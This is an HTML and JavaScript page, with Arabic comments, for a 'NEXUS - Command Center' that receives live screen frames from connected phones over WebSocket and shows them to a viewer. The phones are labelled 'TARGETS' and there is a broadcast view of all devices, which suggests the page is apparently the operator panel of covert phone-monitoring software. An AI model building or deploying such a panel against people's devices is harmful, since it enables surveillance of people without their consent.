<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS - Command Center</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;700&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        :root {
            --neon-blue: #00f0ff;
            --neon-green: #00ff88;
            --neon-red: #ff0044;
            --neon-purple: #7b2fff;
            --dark-bg: #0a0a1a;
            --glass: rgba(255,255,255,0.03);
            --glass-border: rgba(255,255,255,0.08);
        }

        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: var(--dark-bg);
            color: #fff;
            font-family: 'JetBrains Mono', monospace;
        }

        /* ─── الخلفية المتحركة ─── */
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 30% 50%, rgba(0,240,255,0.03) 0%, transparent 50%),
                radial-gradient(circle at 70% 50%, rgba(123,47,255,0.03) 0%, transparent 50%);
            z-index: 0;
            pointer-events: none;
        }

        /* ─── الهيكل الرئيسي ─── */
        .app-container {
            position: relative;
            z-index: 1;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            background: var(--dark-bg);
        }

        /* ─── شريط العنوان العلوي ─── */
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            background: rgba(0,0,0,0.8);
            border-bottom: 1px solid rgba(0,240,255,0.15);
            height: 55px;
            flex-shrink: 0;
            z-index: 100;
        }
        
        .top-bar .logo {
            font-family: 'Orbitron', sans-serif;
            font-size: 18px;
            font-weight: 900;
            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 2px;
        }
        
        .top-bar .status-group {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .status-pill {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 4px 12px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.1);
            font-size: 11px;
            color: #888;
            font-family: 'JetBrains Mono', monospace;
        }
        
        .status-pill .dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            display: inline-block;
        }
        .status-pill .dot.online { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
        .status-pill .dot.offline { background: var(--neon-red); }

        /* ─── المحتوى الرئيسي ─── */
        .main-area {
            flex: 1;
            display: flex;
            overflow: hidden;
            position: relative;
        }

        /* ─── الشريط الجانبي للأجهزة ─── */
        .devices-sidebar {
            width: 220px;
            background: rgba(0,0,0,0.6);
            border-right: 1px solid var(--glass-border);
            padding: 15px;
            overflow-y: auto;
            flex-shrink: 0;
            backdrop-filter: blur(10px);
        }
        .devices-sidebar::-webkit-scrollbar { width: 2px; }
        .devices-sidebar::-webkit-scrollbar-thumb { background: var(--neon-blue); border-radius: 10px; }
        
        .sidebar-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
            color: var(--neon-blue);
            letter-spacing: 2px;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid rgba(0,240,255,0.2);
            display: flex;
            justify-content: space-between;
        }
        .sidebar-title .count { color: #666; font-family: 'JetBrains Mono', monospace; }

        .device-item {
            padding: 10px 12px;
            margin-bottom: 6px;
            background: rgba(255,255,255,0.03);
            border: 1px solid transparent;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .device-item:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.1); }
        .device-item.active { 
            border-color: var(--neon-green); 
            background: rgba(0,255,136,0.06);
            box-shadow: 0 0 15px rgba(0,255,136,0.05);
        }
        .device-item .name { font-size: 13px; font-weight: 600; }
        .device-item .meta { font-size: 10px; color: #666; margin-top: 3px; }
        .device-item .status-dot {
            display: inline-block;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            margin-right: 4px;
        }

        /* ─── منطقة الشاشة ─── */
        .screen-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            position: relative;
            background: #000;
            overflow: hidden;
        }

        /* ─── حاوية الشاشة (تملأ كل المساحة المتاحة) ─── */
        .screen-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            background: #000;
            min-height: 0; /* مهم لـ flex */
        }

        /* ─── صورة الشاشة الحية ─── */
        .screen-container canvas {
            display: block;
            width: 100% !important;
            height: 100% !important;
            object-fit: contain;
            image-rendering: auto;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        /* ─── عنصر الانتظار ─── */
        .placeholder {
            text-align: center;
            color: #333;
            z-index: 2;
        }
        .placeholder .icon { font-size: 60px; margin-bottom: 10px; opacity: 0.5; }
        .placeholder h3 { font-size: 16px; color: #555; font-weight: 400; }

        /* ─── شريط التحكم السفلي (يظهر دائماً) ─── */
        .control-bar {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 20px;
            background: rgba(0,0,0,0.85);
            border-top: 1px solid var(--glass-border);
            height: 55px;
            flex-shrink: 0;
            z-index: 100;
            backdrop-filter: blur(10px);
        }
        
        .control-bar .btn {
            padding: 8px 18px;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 6px;
            background: rgba(255,255,255,0.05);
            color: #aaa;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 6px;
            white-space: nowrap;
        }
        .control-bar .btn:hover { background: rgba(255,255,255,0.1); color: #fff; }
        .control-bar .btn.active { 
            border-color: var(--neon-red); 
            color: var(--neon-red); 
            background: rgba(255,0,68,0.1);
        }
        .control-bar .btn.primary {
            border-color: var(--neon-blue);
            color: var(--neon-blue);
            background: rgba(0,240,255,0.08);
        }
        .control-bar .btn.primary:hover {
            background: rgba(0,240,255,0.15);
            box-shadow: 0 0 20px rgba(0,240,255,0.1);
        }
        .control-bar .btn.danger {
            border-color: var(--neon-red);
            color: var(--neon-red);
            background: rgba(255,0,68,0.08);
        }
        .control-bar .btn.danger:hover {
            background: rgba(255,0,68,0.15);
        }
        .control-bar .btn .icon { font-size: 14px; }

        .control-bar .spacer { flex: 1; }
        
        .control-bar .stats {
            display: flex;
            gap: 15px;
            font-size: 11px;
            color: #666;
            font-family: 'JetBrains Mono', monospace;
        }
        .control-bar .stats span { display: flex; align-items: center; gap: 4px; }
        .control-bar .stats .value { color: var(--neon-blue); font-weight: 700; }

        /* ─── وضع ملء الشاشة ─── */
        .screen-container:fullscreen {
            width: 100vw !important;
            height: 100vh !important;
            padding: 0;
            background: #000;
        }
        .screen-container:fullscreen canvas {
            width: 100vw !important;
            height: 100vh !important;
            max-width: 100vw;
            max-height: 100vh;
        }

        /* ─── إخفاء الشريط الجانبي في الشاشات الصغيرة ─── */
        @media (max-width: 768px) {
            .devices-sidebar { 
                position: absolute;
                left: -220px;
                top: 0;
                bottom: 0;
                z-index: 50;
                transition: left 0.3s;
                background: rgba(0,0,0,0.95);
            }
            .devices-sidebar.open { left: 0; }
            .devices-sidebar .toggle-btn {
                display: flex !important;
                position: absolute;
                right: -35px;
                top: 10px;
                width: 30px;
                height: 30px;
                background: var(--neon-blue);
                color: #000;
                border: none;
                border-radius: 0 5px 5px 0;
                cursor: pointer;
                align-items: center;
                justify-content: center;
                font-size: 16px;
            }
            .control-bar .stats { display: none; }
        }

        /* ─── Toast ─── */
        .toast {
            position: fixed;
            bottom: 70px;
            left: 50%;
            transform: translateX(-50%);
            padding: 10px 25px;
            background: rgba(0,240,255,0.1);
            border: 1px solid rgba(0,240,255,0.3);
            border-radius: 8px;
            font-size: 12px;
            color: var(--neon-blue);
            display: none;
            z-index: 9999;
            font-family: 'JetBrains Mono', monospace;
            backdrop-filter: blur(20px);
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-50%) translateY(10px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- ─── الشريط العلوي ─── -->
        <div class="top-bar">
            <div class="logo">⟨ NEXUS ⟩</div>
            <div class="status-group">
                <div class="status-pill">
                    <span class="dot offline" id="statusDot"></span>
                    <span id="statusText">DISCONNECTED</span>
                </div>
                <div class="status-pill">
                    📡 <span id="fpsDisplay">0</span> FPS
                </div>
            </div>
        </div>

        <!-- ─── المحتوى الرئيسي ─── -->
        <div class="main-area">
            <!-- ─── الشريط الجانبي للأجهزة ─── -->
            <div class="devices-sidebar" id="devicesSidebar">
                <button class="toggle-btn" onclick="toggleSidebar()" style="display:none;">☰</button>
                <div class="sidebar-title">
                    TARGETS
                    <span class="count" id="deviceCount">0</span>
                </div>
                <div id="deviceList">
                    <div class="device-item active" onclick="selectDevice(this)" data-id="all">
                        <div class="name">🌐 ALL DEVICES</div>
                        <div class="meta"><span class="status-dot" style="background:var(--neon-blue)"></span> BROADCAST</div>
                    </div>
                </div>
            </div>

            <!-- ─── منطقة الشاشة ─── -->
            <div class="screen-area">
                <div class="screen-container" id="screenContainer">
                    <div class="placeholder" id="placeholder">
                        <div class="icon">📡</div>
                        <h3>SELECT TARGET TO INITIALIZE</h3>
                    </div>
                    <canvas id="screenCanvas"></canvas>
                </div>

                <!-- ─── شريط التحكم السفلي ─── -->
                <div class="control-bar">
                    <button class="btn primary" onclick="toggleStream()" id="streamBtn">
                        <span class="icon">▶</span>
                        <span>START</span>
                    </button>
                    <button class="btn" onclick="clearScreen()">
                        <span class="icon">✕</span>
                        <span>CLEAR</span>
                    </button>
                    <button class="btn" onclick="toggleFullscreen()">
                        <span class="icon">⛶</span>
                        <span>FULL</span>
                    </button>
                    
                    <div class="spacer"></div>
                    
                    <div class="stats">
                        <span>FPS: <span class="value" id="fpsValue">0</span></span>
                        <span>LAT: <span class="value" id="latencyValue">0ms</span></span>
                        <span>FRAMES: <span class="value" id="framesValue">0</span></span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        // ─── التهيئة ───
        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
        const WS_URL = `${protocol}//${location.host}`;
        
        let ws = null;
        let selectedDevice = 'all';
        let streamActive = true; // يبدأ تلقائياً
        let frameCount = 0;
        let lastFrameTime = Date.now();
        let fpsValues = [];
        let devices = {};
        let sidebarOpen = false;
        
        const canvas = document.getElementById('screenCanvas');
        const ctx = canvas.getContext('2d');
        
        // ─── بدء التشغيل ───
        connect();
        updateStreamBtn();
        
        // ─── WebSocket ───
        function connect() {
            if (ws && ws.readyState === WebSocket.OPEN) return;
            
            ws = new WebSocket(`${WS_URL}?type=viewer&viewer=${Math.random().toString(36).substring(7)}`);
            
            ws.onopen = () => { 
                updateConnection(true); 
                showToast('🟢 SYSTEM ONLINE');
            };
            
            ws.onmessage = (event) => { 
                try { 
                    handleMessage(JSON.parse(event.data)); 
                } catch(e) {} 
            };
            
            ws.onclose = () => { 
                updateConnection(false);
                setTimeout(connect, 3000); 
            };
            
            ws.onerror = () => {};
        }

        function handleMessage(data) {
            switch(data.type) {
                case 'device_list':
                    devices = {};
                    data.devices.forEach(d => { devices[d.id] = { id: d.id, online: true }; });
                    renderDevices();
                    break;
                case 'device_online':
                    devices[data.deviceId] = { id: data.deviceId, online: true };
                    renderDevices();
                    showToast(`📱 TARGET: ${data.deviceId.substring(0,4)}`);
                    break;
                case 'device_offline':
                    if (devices[data.deviceId]) devices[data.deviceId].online = false;
                    renderDevices();
                    break;
                case 'frame':
                    if ((selectedDevice === 'all' || selectedDevice === data.deviceId) && streamActive) {
                        renderFrame(data.image);
                        updateStats();
                    }
                    break;
            }
        }

        function renderFrame(base64Image) {
            const img = new Image();
            img.onload = () => {
                // نرسم الصورة لتملأ الكانفاس بالكامل
                canvas.width = img.width;
                canvas.height = img.height;
                
                // ضبط الكانفاس ليملأ الحاوية
                canvas.style.width = '100%';
                canvas.style.height = '100%';
                canvas.style.position = 'absolute';
                canvas.style.top = '50%';
                canvas.style.left = '50%';
                canvas.style.transform = 'translate(-50%, -50%)';
                canvas.style.objectFit = 'contain';
                
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                document.getElementById('placeholder').style.display = 'none';
                frameCount++;
                document.getElementById('framesValue').textContent = frameCount;
            };
            img.src = 'data:image/jpeg;base64,' + base64Image;
        }

        function updateStats() {
            const now = Date.now();
            const elapsed = now - lastFrameTime;
            lastFrameTime = now;
            
            const fps = Math.round(1000 / Math.max(elapsed, 1));
            fpsValues.push(fps);
            if (fpsValues.length > 15) fpsValues.shift();
            
            const avgFps = Math.round(fpsValues.reduce((a,b)=>a+b, 0) / fpsValues.length);
            document.getElementById('fpsValue').textContent = avgFps;
            document.getElementById('fpsDisplay').textContent = avgFps;
            document.getElementById('latencyValue').textContent = elapsed + 'ms';
        }

        function renderDevices() {
            const list = document.getElementById('deviceList');
            const ids = Object.keys(devices);
            
            let html = `<div class="device-item ${selectedDevice === 'all' ? 'active' : ''}" onclick="selectDevice(this)" data-id="all">
                <div class="name">🌐 ALL DEVICES</div>
                <div class="meta"><span class="status-dot" style="background:var(--neon-blue)"></span> BROADCAST</div>
            </div>`;
            
            ids.forEach(id => {
                const d = devices[id];
                html += `<div class="device-item ${selectedDevice === id ? 'active' : ''}" onclick="selectDevice(this)" data-id="${id}">
                    <div class="name">📱 ${id.substring(0,4).toUpperCase()}</div>
                    <div class="meta">
                        <span class="status-dot" style="background:${d.online ? 'var(--neon-green)' : 'var(--neon-red)'}"></span>
                        ${d.online ? 'ACTIVE' : 'OFFLINE'}
                    </div>
                </div>`;
            });
            
            list.innerHTML = html;
            document.getElementById('deviceCount').textContent = ids.length;
        }

        function selectDevice(element) {
            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            selectedDevice = element.dataset.id;
            
            // إغلاق الشريط في الجوال
            if (window.innerWidth <= 768) {
                document.getElementById('devicesSidebar').classList.remove('open');
            }
        }

        function toggleStream() {
            streamActive = !streamActive;
            updateStreamBtn();
            if (!streamActive) {
                document.getElementById('streamBtn').querySelector('.icon').textContent = '▶';
            } else {
                document.getElementById('streamBtn').querySelector('.icon').textContent = '⏹';
            }
        }

        function updateStreamBtn() {
            const btn = document.getElementById('streamBtn');
            const icon = btn.querySelector('.icon');
            const text = btn.querySelector('span:last-child');
            
            if (streamActive) {
                icon.textContent = '⏹';
                text.textContent = 'LIVE';
                btn.className = 'btn danger';
            } else {
                icon.textContent = '▶';
                text.textContent = 'START';
                btn.className = 'btn primary';
            }
        }

        function clearScreen() {
            canvas.style.width = '0';
            canvas.style.height = '0';
            document.getElementById('placeholder').style.display = 'block';
            frameCount = 0;
            document.getElementById('framesValue').textContent = '0';
        }

        function toggleFullscreen() {
            const container = document.getElementById('screenContainer');
            if (!document.fullscreenElement) {
                if (container.requestFullscreen) {
                    container.requestFullscreen();
                } else if (container.webkitRequestFullscreen) {
                    container.webkitRequestFullscreen();
                } else if (container.msRequestFullscreen) {
                    container.msRequestFullscreen();
                }
            } else {
                if (document.exitFullscreen) {
                    document.exitFullscreen();
                } else if (document.webkitExitFullscreen) {
                    document.webkitExitFullscreen();
                } else if (document.msExitFullscreen) {
                    document.msExitFullscreen();
                }
            }
        }

        function toggleSidebar() {
            sidebarOpen = !sidebarOpen;
            document.getElementById('devicesSidebar').classList.toggle('open', sidebarOpen);
        }

        function updateConnection(online) {
            const dot = document.getElementById('statusDot');
            const text = document.getElementById('statusText');
            dot.className = `dot ${online ? 'online' : 'offline'}`;
            text.textContent = online ? 'CONNECTED' : 'DISCONNECTED';
        }

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.style.display = 'block';
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => { toast.style.display = 'none'; }, 3000);
        }

        // ─── عند تغيير حجم الشاشة ───
        window.addEventListener('resize', () => {
            // الكانفاس يتأقلم تلقائياً مع CSS
        });

        // ─── الفل شاشة ───
        document.addEventListener('fullscreenchange', handleFullscreenChange);
        document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
        document.addEventListener('mozfullscreenchange', handleFullscreenChange);
        document.addEventListener('MSFullscreenChange', handleFullscreenChange);

        function handleFullscreenChange() {
            if (document.fullscreenElement) {
                document.getElementById('screenContainer').classList.add('fullscreen');
            } else {
                document.getElementById('screenContainer').classList.remove('fullscreen');
            }
        }
    </script>
</body>
    </html>
